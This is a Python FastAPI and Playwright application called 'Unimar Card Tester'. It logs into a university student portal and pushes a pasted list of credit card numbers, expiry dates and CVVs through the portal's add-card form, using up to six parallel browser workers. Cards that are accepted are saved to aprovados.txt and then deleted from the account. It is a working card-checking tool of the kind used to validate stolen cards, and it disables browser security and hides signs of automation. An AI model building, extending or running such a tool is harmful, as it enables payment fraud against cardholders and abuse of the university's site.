import os
import time
import asyncio
import subprocess
import random
import datetime
import logging
from pathlib import Path
from typing import Set, Optional
from contextlib import asynccontextmanager
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel, field_validator
from playwright.async_api import async_playwright
import uvicorn

# ================= CONFIGURAÇÕES GLOBAIS =================
PORT = int(os.getenv("PORT", "8000"))
URL_LOGIN = os.getenv("UNIMAR_URL_LOGIN", "https://digital.unimar.br/login/app")
URL_MEUS_CARTOES = os.getenv("UNIMAR_URL_CARTOES", "https://digital.unimar.br/areadoaluno/conta/meuscartoes")
EMAIL = os.getenv("UNIMAR_EMAIL", "")
SENHA = os.getenv("UNIMAR_SENHA", "")
NOME_FIXO = os.getenv("UNIMAR_NOME", "")
MAX_TENTATIVAS = int(os.getenv("UNIMAR_MAX_TENTATIVAS", "3"))
MAX_CANAIS = int(os.getenv("UNIMAR_MAX_CANAIS", "6"))
VIEWPORT = {"width": 1280, "height": 720}
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
BROWSER_ARGS = [
    "--no-sandbox",
    "--disable-dev-shm-usage",
    "--disable-gpu",
    "--disable-web-security",
    "--disable-features=IsolateOrigins,site-per-process",
    "--disable-blink-features=AutomationControlled",
    "--disable-setuid-sandbox",
]
SESSAO_PATH = Path("sessao_unimar.json")
SESSAO_MAX_AGE = 86400

# ================= CONFIGURAÇÃO DE LOGS =================
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("unimar")

# ================= VERIFICAÇÃO DO PLAYWRIGHT =================
def garantir_playwright() -> bool:
    """
    Verifica se os binários do Chromium do Playwright estão instalados no ambiente.
    Caso contrário, tenta realizar a instalação via subprocesso.
    """
    ms_playwright = Path("/root/.cache/ms-playwright")
    if ms_playwright.exists():
        for pasta in ms_playwright.iterdir():
            if pasta.is_dir() and pasta.name.startswith("chromium-"):
                chrome = pasta / "chrome-linux" / "chrome"
                if chrome.exists():
                    logger.info("Chromium encontrado: %s", chrome)
                    return True
    logger.warning("Chromium não encontrado. Instalando...")
    try:
        subprocess.run(["playwright", "install", "chromium"], check=True, timeout=120)
        return True
    except Exception:
        logger.exception("Erro ao instalar Chromium")
        return False

# ================= GERENCIAMENTO DE ESTADO =================
class Estado:
    """Controla o estado global compartilhado da aplicação de forma thread-safe."""
    def __init__(self):
        self.lock = asyncio.Lock()
        self.rodando = False
        self.cancelado = False
        self.clients: Set[WebSocket] = set()
        self.total_cartoes = 0
        self.tarefas_concluidas = 0
        self.aprovados = 0
        self.inicio_timestamp = 0.0
        self.canais_ativos = 0
        self.task: Optional[asyncio.Task] = None

estado = Estado()

# ================= FUNÇÕES AUXILIARES DE ESTADO E MÉTRICAS =================
async def set_estado(**kwargs) -> None:
    """Atualiza variáveis de estado de forma assíncrona e protegida por lock."""
    async with estado.lock:
        for k, v in kwargs.items():
            setattr(estado, k, v)

async def inc_estado(campo: str, valor: int = 1) -> int:
    """Incrementa um contador numérico no estado global de forma segura."""
    async with estado.lock:
        atual = getattr(estado, campo)
        novo = atual + valor
        setattr(estado, campo, novo)
        return novo

async def calc_velocidade() -> tuple[float, int]:
    """Calcula a velocidade de processamento (cartões por minuto) e o tempo decorrido."""
    async with estado.lock:
        inicio = estado.inicio_timestamp
        concluidas = estado.tarefas_concluidas
        elapsed = time.time() - inicio if inicio else 0
        velocidade = concluidas / (elapsed / 60) if elapsed > 0 else 0
        return round(velocidade, 1), round(elapsed)

async def broadcast(app: FastAPI, tipo: str, data: dict | None = None) -> None:
    """Envia mensagens em tempo real via WebSocket para todos os clientes conectados."""
    if data is None:
        data = {}
    mensagem = {"type": tipo, **data}
    async with estado.lock:
        clients = list(estado.clients)
        if not clients:
            return
    tarefas = [client.send_json(mensagem) for client in clients]
    resultados = await asyncio.gather(*tarefas, return_exceptions=True)
    mortos = [c for c, r in zip(clients, resultados) if isinstance(r, Exception)]
    if mortos:
        async with estado.lock:
            for c in mortos:
                estado.clients.discard(c)
    logger.info("Broadcast %s enviado para %d cliente(s)", tipo, len(clients) - len(mortos))

def _log_task_exception(task: asyncio.Task) -> None:
    """Callback para capturar exceções silenciosas em tarefas de log em segundo plano."""
    if task.cancelled():
        return
    exc = task.exception()
    if exc:
        logger.error("Erro no broadcast de log: %s", exc)

def log(app: FastAPI, msg: str) -> None:
    """Registra logs localmente e transmite via WebSocket para o painel."""
    timestamp = time.strftime("%H:%M:%S")
    full = f"[{timestamp}] {msg}"
    logger.info(msg)
    try:
        loop = asyncio.get_running_loop()
        task = loop.create_task(broadcast(app, "log", {"mensagem": full}))
        task.add_done_callback(_log_task_exception)
    except RuntimeError:
        pass

# ================= SCHEMAS DE VALIDAÇÃO (PYDANTIC) =================
class IniciarRequest(BaseModel):
    lista: str
    canais: int = 4

    @field_validator("canais")
    @classmethod
    def validar_canais(cls, v):
        """Valida se o número de canais solicitados está dentro dos limites permitidos."""
        if v < 1 or v > MAX_CANAIS:
            raise ValueError(f"Canais deve ser entre 1 e {MAX_CANAIS}")
        return v

# ================= KEEPALIVE WEBSOCKET =================
async def _ws_keepalive():
    """Envia um ping periódico a cada 30 segundos para manter as conexões WebSocket ativas."""
    while True:
        await asyncio.sleep(30)
        async with estado.lock:
            clients = list(estado.clients)
        for client in clients:
            try:
                await client.send_json({"type": "ping"})
            except Exception:
                async with estado.lock:
                    estado.clients.discard(client)

# ================= CICLO DE VIDA DO APLICATIVO (LIFESPAN) =================
@asynccontextmanager
async def lifespan(app: FastAPI):
    """Gerencia a inicialização e o encerramento seguro do FastAPI, Playwright e tarefas em background."""
    app.state.playwright_ok = await asyncio.to_thread(garantir_playwright)
    app.state.job_task = None
    app.state.browser = None
    keepalive_task = asyncio.create_task(_ws_keepalive())
    yield
    keepalive_task.cancel()
    try:
        await keepalive_task
    except asyncio.CancelledError:
        pass
    if estado.task and not estado.task.done():
        estado.cancelado = True
        estado.rodando = False
        estado.task.cancel()
        try:
            await estado.task
        except Exception:
            pass

app = FastAPI(title="Unimar Card Tester", lifespan=lifespan)

# ================= FLUXOS DO PLAYWRIGHT =================
async def sessao_valida(context) -> bool:
    """Valida se o arquivo de sessão salvo ainda é válido abrindo a página de cartões."""
    if not SESSAO_PATH.exists():
        return False
    if time.time() - SESSAO_PATH.stat().st_mtime > SESSAO_MAX_AGE:
        return False
    try:
        page = await context.new_page()
        try:
            await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=15000)
            try:
                await page.get_by_role("button", name="Adicionar Cartão de Crédito") \
                    .wait_for(state="visible", timeout=8000)
                return True
            except Exception:
                return False
        finally:
            await page.close()
    except Exception:
        logger.warning("Erro ao validar sessão", exc_info=True)
        return False

async def limpar_cartoes(page, app: FastAPI) -> None:
    """Remove cartões salvos anteriormente na conta para liberar espaço e evitar conflitos."""
    try:
        log(app, "[Faxina] Iniciando limpeza...")
        if URL_MEUS_CARTOES not in page.url:
            await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
        try:
            await page.get_by_role("button", name="Remover").first \
                .wait_for(state="visible", timeout=5000)
        except Exception:
            log(app, "[Faxina] Nenhum cartão para remover")
            return
        removidos = 0
        for _ in range(50):
            if estado.cancelado:
                break
            botoes = page.get_by_role("button", name="Remover")
            if await botoes.count() == 0:
                break
            try:
                await botoes.first.click(force=True, timeout=5000)
                await page.wait_for_function(
                    """(antes) => document.querySelectorAll(
                        '[role="button"], button'
                    ).length < antes""",
                    arg=len(await page.query_selector_all("button")),
                    timeout=5000,
                )
                removidos += 1
            except Exception:
                break
        log(app, f"[Faxina] {removidos} removidos")
    except Exception:
        logger.exception("[Faxina] Erro")

async def login_mestre(playwright, app: FastAPI, browser) -> bool:
    """Realiza o processo de autenticação na plataforma da Unimar, utilizando seletores precisos para login e senha."""
    try:
        if not EMAIL or not SENHA:
            log(app, "[ERRO] Email/senha não configurados!")
            return False

        context = await browser.new_context(viewport=VIEWPORT, user_agent=USER_AGENT)
        page = await context.new_page()
        page.on("dialog", lambda d: asyncio.create_task(d.accept()))

        try:
            if SESSAO_PATH.exists():
                await context.close()
                context = await browser.new_context(
                    storage_state=str(SESSAO_PATH),
                    viewport=VIEWPORT,
                    user_agent=USER_AGENT,
                )
                page = await context.new_page()
                page.on("dialog", lambda d: asyncio.create_task(d.accept()))
                if await sessao_valida(context):
                    log(app, "[Auth] Sessão reutilizada (Modo Fast)")
                    await context.close()
                    return True
                log(app, "[Auth] Sessão expirada, fazendo login completo...")

            log(app, "[Auth] Login completo (Modo Full)...")
            log(app, "Acessando a página de login...")
            await page.goto(URL_LOGIN, wait_until="networkidle", timeout=30000)

            # Seletores mapeados com fallbacks para garantir a interação correta
            email_input = page.locator('input[type="email"], input[name="email"], input[name="login"], input[type="text"]').first
            password_input = page.locator('input[type="password"]').first
            submit_button = page.locator('button[type="submit"], input[type="submit"], button:has-text("Entrar"), button:has-text("Acessar")').first

            log(app, "Preenchendo e-mail e senha...")
            await email_input.wait_for(state="visible", timeout=15000)
            await email_input.fill(EMAIL)
            
            await password_input.wait_for(state="visible", timeout=10000)
            await password_input.fill(SENHA)

            log(app, "Clicando no botão de entrar...")
            await submit_button.click()

            # Aguarda o carregamento pós-login
            await page.wait_for_load_state("networkidle")
            
            try:
                await page.wait_for_url("**/areadoaluno/**", timeout=30000)
            except Exception:
                await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=15000)

            await context.storage_state(path=str(SESSAO_PATH))
            await limpar_cartoes(page, app)
            await context.close()
            log(app, "[Auth] Login concluído!")
            return True
        except Exception:
            await context.close()
            raise
    except Exception:
        logger.exception("[ERRO] Login falhou")
        return False

# ================= VALIDAÇÕES DE CARTÃO =================
def validar_luhn(numero: str) -> bool:
    """Implementa o algoritmo de Luhn para verificar a validade matemática do número do cartão."""
    digits = [int(d) for d in numero if d.isdigit()]
    if len(digits) < 13 or len(digits) > 19:
        return False
    checksum = 0
    for i, d in enumerate(reversed(digits)):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return checksum % 10 == 0

def validar_cartao(numero: str, mes: str, ano: str, cvv: str) -> str | None:
    """Valida estruturalmente os dados de um cartão de crédito antes de tentar o envio."""
    if not numero.isdigit() or not validar_luhn(numero):
        return "Número inválido (Luhn)"
    if not mes.isdigit() or not (1 <= int(mes) <= 12):
        return "Mês inválido"
    if not ano.isdigit() or int(ano) < datetime.datetime.now().year:
        return "Ano expirado"
    if not cvv.isdigit() or len(cvv) not in (3, 4):
        return "CVV inválido"
    return None

_ERRO_KEYWORDS = [
    "inválida", "recusado", "erro", "não foi possível", "inválido",
    "declined", "invalid", "refused", "failed", "falhou",
    "cartão não", "tente novamente", "não autorizado", "negado",
]

async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> str:
    """Preenche o formulário web com os dados do cartão e submete para teste."""
    _TIMEOUT = 15000
    try:
        if URL_MEUS_CARTOES not in page.url:
            await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)

        url_atual = page.url
        if "login" in url_atual.lower():
            logger.warning("Sessão expirada! URL atual: %s", url_atual)
            return "erro:sessao_expirada"

        btn_adicionar = page.locator(
            "button:has-text('Adicionar Cartão'), button:has-text('Novo Cartão'), "
            "[role='button']:has-text('Cartão')"
        ).first
        if not await btn_adicionar.count():
            btn_adicionar = page.get_by_role("button", name="Adicionar Cartão de Crédito")
        if not await btn_adicionar.count():
            return "erro:botao_adicionar_nao_encontrado"

        try:
            await btn_adicionar.scroll_into_view_if_needed(timeout=_TIMEOUT)
        except Exception:
            pass
        await btn_adicionar.click(force=True, timeout=_TIMEOUT)

        num_input = page.locator(
            "input[name*='card'], input[id*='card'], "
            "input[placeholder*='Número'], input[aria-label*='Número']"
        ).first
        try:
            await num_input.wait_for(state="visible", timeout=_TIMEOUT)
        except Exception:
            num_input = page.get_by_role("textbox", name="Número do cartão")
            try:
                await num_input.wait_for(state="visible", timeout=5000)
            except Exception:
                return "erro:campos_numero_nome"

        try:
            await num_input.fill("")
            await num_input.fill(numero)
        except Exception:
            return "erro:campos_numero_nome"

        nome_input = page.locator(
            "input[name*='name'], input[id*='name'], "
            "input[placeholder*='Nome'], input[aria-label*='Nome']"
        ).first
        try:
            await nome_input.fill(NOME_FIXO)
        except Exception:
            nome_input = page.get_by_role("textbox", name="Nome impresso no cartão")
            try:
                await nome_input.fill(NOME_FIXO)
            except Exception:
                return "erro:campos_numero_nome"

        try:
            mes_el = page.locator(
                "select[name*='month'], select[id*='month'], select[aria-label*='Mês']"
            ).first
            if await mes_el.count() > 0:
                await mes_el.select_option(mes, timeout=_TIMEOUT)
            else:
                await page.get_by_label("Mês").select_option(mes, timeout=_TIMEOUT)
        except Exception:
            return "erro:select_mes"

        try:
            ano_el = page.locator(
                "select[name*='year'], select[id*='year'], select[aria-label*='Ano']"
            ).first
            if await ano_el.count() > 0:
                await ano_el.select_option(ano, timeout=_TIMEOUT)
            else:
                await page.get_by_label("Ano").select_option(ano, timeout=_TIMEOUT)
        except Exception:
            return "erro:select_ano"

        try:
            cvv_input = page.locator(
                "input[name*='cvv'], input[name*='cvc'], input[id*='cvv'], "
                "input[placeholder*='CVV'], input[aria-label*='CVV']"
            ).first
            try:
                await cvv_input.fill(cvv)
            except Exception:
                cvv_input = page.get_by_role("textbox", name="CVV")
                await cvv_input.fill(cvv)
        except Exception:
            return "erro:campo_cvv"

        botoes_antes = await page.get_by_role("button", name="Remover").count()

        try:
            btn_registrar = page.locator(
                "button:has-text('Registrar Cartão de Crédito'), "
                "button:has-text('Registrar'), "
                "button:has-text('Salvar'), "
                "button:has-text('Cadastrar')"
            ).first

            if not await btn_registrar.count():
                btn_registrar = page.get_by_role("button", name="Registrar Cartão de Crédito")

            await btn_registrar.scroll_into_view_if_needed(timeout=_TIMEOUT)
            await btn_registrar.click(timeout=_TIMEOUT)
        except Exception:
            return "erro:botao_registrar"

        resultado = await _aguardar_resultado(page, botoes_antes, timeout=12000)
        if resultado is not None:
            return resultado

        return "reprovado"
    except Exception as exc:
        logger.exception("Erro em processar_cartao")
        return f"erro:{type(exc).__name__}"

async def _aguardar_resultado(page, botoes_antes: int, timeout: int) -> str | None:
    """Aguarda ativamente por alterações na página (como surgimento de botão 'Remover' ou alertas de erro)."""
    deadline = time.time() + timeout / 1000
    while time.time() < deadline:
        if estado.cancelado:
            return "cancelado"

        botoes_apos = await page.get_by_role("button", name="Remover").count()
        if botoes_apos > botoes_antes:
            return "aprovado"

        try:
            erros = page.locator(
                ".alert, .toast, .notification, [role='alert'], "
                ".error, .invalid-feedback, span[style*='color: red']"
            )
            if await erros.count() > 0:
                texto = (await erros.first.inner_text()).lower()
                if any(x in texto for x in _ERRO_KEYWORDS):
                    return "reprovado"
        except Exception:
            pass

        await asyncio.sleep(0.15)
    return None

async def _criar_contexto_worker(browser):
    """Cria um novo contexto isolado do navegador para um worker específico."""
    context = await browser.new_context(
        storage_state=str(SESSAO_PATH),
        viewport=VIEWPORT,
        user_agent=USER_AGENT,
    )
    page = await context.new_page()
    page.on("dialog", lambda d: asyncio.create_task(d.accept()))
    await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
    return context, page

# ================= WORKER CONCORRENTE =================
async def worker(id_worker: int, browser, fila: asyncio.Queue, app: FastAPI) -> None:
    """Worker assíncrono individual que consome cartões da fila e executa os testes na interface."""
    await inc_estado("canais_ativos", 1)
    await broadcast(app, "status", {"canais_ativos": estado.canais_ativos})
    context = None
    page = None
    try:
        await asyncio.sleep((id_worker - 1) * 0.3)
        log(app, f"[Canal {id_worker}] Iniciando")
        context, page = await _criar_contexto_worker(browser)

        while estado.rodando and not estado.cancelado:
            try:
                indice, linha, tentativa = await asyncio.wait_for(fila.get(), timeout=2.0)
            except asyncio.TimeoutError:
                if fila.empty():
                    break
                continue

            try:
                partes = [x.strip() for x in linha.split("|")]
                if len(partes) != 4:
                    log(app, f"[Canal {id_worker}][{indice}] ❌ Formato inválido")
                    await broadcast(app, "reprovado", {"cartao": linha})
                    await inc_estado("tarefas_concluidas", 1)
                    continue

                numero, mes, ano, cvv = partes
                erro_validacao = validar_cartao(numero, mes, ano, cvv)
                if erro_validacao:
                    log(app, f"[Canal {id_worker}][{indice}] ❌ {erro_validacao}")
                    await broadcast(app, "reprovado", {"cartao": linha})
                    await inc_estado("tarefas_concluidas", 1)
                    continue

                log(app, f"[Canal {id_worker}][{indice}] ****{numero[-4:]}")

                try:
                    resultado = await processar_cartao(page, numero, mes, ano, cvv)
                except Exception:
                    logger.exception("[Canal %s] Page crash, recriando...", id_worker)
                    log(app, f"[Canal {id_worker}] ⚠️ Recriando contexto...")
                    try:
                        if context:
                            await context.close()
                    except Exception:
                        pass
                    context, page = await _criar_contexto_worker(browser)
                    await fila.put((indice, linha, tentativa))
                    continue

                if resultado == "aprovado":
                    log(app, f"[Canal {id_worker}][{indice}] ✅ APROVADO")
                    await broadcast(app, "aprovado", {"cartao": linha})
                    await inc_estado("aprovados", 1)
                    await asyncio.to_thread(_escrever_aprovado, linha)
                    await inc_estado("tarefas_concluidas", 1)
                elif resultado == "reprovado":
                    log(app, f"[Canal {id_worker}][{indice}] ❌ Reprovado")
                    await broadcast(app, "reprovado", {"cartao": linha})
                    await inc_estado("tarefas_concluidas", 1)
                elif resultado == "timeout" and tentativa < MAX_TENTATIVAS:
                    log(app, f"[Canal {id_worker}][{indice}] ⚠️ Timeout - Retentativa {tentativa + 1}")
                    await fila.put((indice, linha, tentativa + 1))
                    continue
                elif resultado == "erro:sessao_expirada" and tentativa < MAX_TENTATIVAS:
                    log(app, f"[Canal {id_worker}][{indice}] ⚠️ Sessão expirada - recriando contexto")
                    try:
                        if context:
                            await context.close()
                    except Exception:
                        pass
                    context, page = await _criar_contexto_worker(browser)
                    await fila.put((indice, linha, tentativa + 1))
                    continue
                else:
                    if resultado == "timeout":
                        log(app, f"[Canal {id_worker}][{indice}] ❌ Timeout máximo")
                    elif resultado == "cancelado":
                        log(app, f"[Canal {id_worker}][{indice}] ⏹️ Cancelado")
                    else:
                        tipo_exc = resultado.split(":", 1)[1] if ":" in resultado else resultado
                        log(app, f"[Canal {id_worker}][{indice}] ❌ Erro: {tipo_exc}")
                    await broadcast(app, "reprovado", {"cartao": linha})
                    await inc_estado("tarefas_concluidas", 1)

                velocidade, elapsed = await calc_velocidade()
                await broadcast(app, "progresso", {
                    "processados": estado.tarefas_concluidas,
                    "total": estado.total_cartoes,
                    "aprovados": estado.aprovados,
                    "velocidade": velocidade,
                    "tempo": elapsed,
                })

            finally:
                fila.task_done()
    except Exception:
        logger.exception("[Canal %s] ERRO", id_worker)
    finally:
        if context:
            try:
                await context.close()
            except Exception:
                pass
        await inc_estado("canais_ativos", -1)
        await broadcast(app, "status", {"canais_ativos": estado.canais_ativos})
        log(app, f"[Canal {id_worker}] Finalizado")

def _escrever_aprovado(linha: str) -> None:
    """Salva os cartões aprovados em um arquivo de texto local."""
    with open("aprovados.txt", "a", encoding="utf-8") as f:
        f.write(f"{linha}\n")

async def processar_todos_cartoes(texto_cartoes: str, num_canais: int, app: FastAPI) -> None:
    """Coordena a execução geral: inicializa a fila, lança o navegador, autentica e distribui as tarefas para os workers."""
    try:
        if not NOME_FIXO:
            log(app, "[ERRO] UNIMAR_NOME não configurado!")
            return

        linhas = list(dict.fromkeys([l.strip() for l in texto_cartoes.splitlines() if l.strip()]))
        if not linhas:
            log(app, "[ERRO] Nenhum cartão fornecido")
            return

        await set_estado(
            total_cartoes=len(linhas),
            tarefas_concluidas=0,
            aprovados=0,
            cancelado=False,
            inicio_timestamp=time.time(),
        )

        num_canais = min(max(num_canais, 1), MAX_CANAIS, len(linhas))
        log(app, f"[Sistema] {num_canais} canais | {len(linhas)} cartões")

        fila = asyncio.Queue()
        for idx, linha in enumerate(linhas, 1):
            await fila.put((idx, linha, 1))

        async with async_playwright() as pw:
            browser = await pw.chromium.launch(headless=True, args=BROWSER_ARGS)
            app.state.browser = browser
            try:
                if not await login_mestre(pw, app, browser):
                    log(app, "[ERRO] Falha na autenticação")
                    return

                tasks = [asyncio.create_task(worker(i, browser, fila, app)) for i in range(1, num_canais + 1)]
                await asyncio.gather(*tasks, return_exceptions=True)

                if estado.aprovados > 0 and not estado.cancelado:
                    log(app, "[Sistema] Faxina final...")
                    try:
                        ctx = await browser.new_context(
                            storage_state=str(SESSAO_PATH),
                            viewport=VIEWPORT,
                            user_agent=USER_AGENT,
                        )
                        pg = await ctx.new_page()
                        pg.on("dialog", lambda d: asyncio.create_task(d.accept()))
                        await limpar_cartoes(pg, app)
                        await ctx.close()
                    except Exception:
                        logger.exception("[Faxina] Erro")
            finally:
                app.state.browser = None
                await browser.close()
    except Exception:
        logger.exception("[ERRO CRÍTICO]")
    finally:
        await set_estado(rodando=False, cancelado=False, canais_ativos=0)
        log(app, "[Sistema] Processamento concluído!")
        await broadcast(app, "status", {"rodando": False, "canais_ativos": 0})

# ================= ROTAS DA API FASTAPI =================
@app.post("/api/iniciar")
async def iniciar(data: IniciarRequest):
    """Inicia o processo de validação de cartões em segundo plano."""
    if estado.rodando:
        return {"status": "já_em_execucao"}
    await set_estado(rodando=True, cancelado=False)
    await broadcast(app, "status", {"rodando": True})
    estado.task = asyncio.create_task(processar_todos_cartoes(data.lista, data.canais, app))
    return {"status": "iniciado"}

@app.post("/api/parar")
async def parar():
    """Interrompe o processamento em andamento."""
    await set_estado(rodando=False, cancelado=True)
    log(app, "⛔ Interrupção solicitada")
    await broadcast(app, "status", {"rodando": False})
    return {"status": "parando"}

@app.get("/api/status")
async def status():
    """Retorna o status atual e as métricas do processamento."""
    velocidade, elapsed = await calc_velocidade()
    return {
        "rodando": estado.rodando,
        "total": estado.total_cartoes,
        "processados": estado.tarefas_concluidas,
        "aprovados": estado.aprovados,
        "canais_ativos": estado.canais_ativos,
        "velocidade": velocidade,
        "tempo": elapsed,
    }

@app.get("/api/health")
async def health():
    """Endpoint básico para verificação de saúde da aplicação."""
    return {"status": "ok"}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    """Gerencia conexões WebSocket para comunicação em tempo real com o frontend."""
    await websocket.accept()
    async with estado.lock:
        estado.clients.add(websocket)
    logger.info("WebSocket conectado: %s", websocket.client)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        logger.info("WebSocket desconectado: %s", websocket.client)
    except Exception:
        logger.exception("Erro no WebSocket")
    finally:
        async with estado.lock:
            estado.clients.discard(websocket)

_cached_template: str | None = None

@app.get("/", response_class=HTMLResponse)
async def index():
    """Serve a interface HTML principal do painel."""
    global _cached_template
    if _cached_template is None:
        template_path = Path("templates/index.html")
        if not template_path.is_file():
            return JSONResponse(
                status_code=404,
                content={"detail": "Template não encontrado. Verifique se o arquivo templates/index.html existe."}
            )
        _cached_template = await asyncio.to_thread(
            template_path.read_text, encoding="utf-8"
        )
    return HTMLResponse(content=_cached_template)

# ================= EXECUÇÃO PRINCIPAL =================
if __name__ == "__main__":
    print("=" * 50)
    print(f"🚀 Unimar Card Tester iniciando em 0.0.0.0:{PORT}")
    print("🎭 Playwright será verificado no startup")
    print("=" * 50)
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="info")
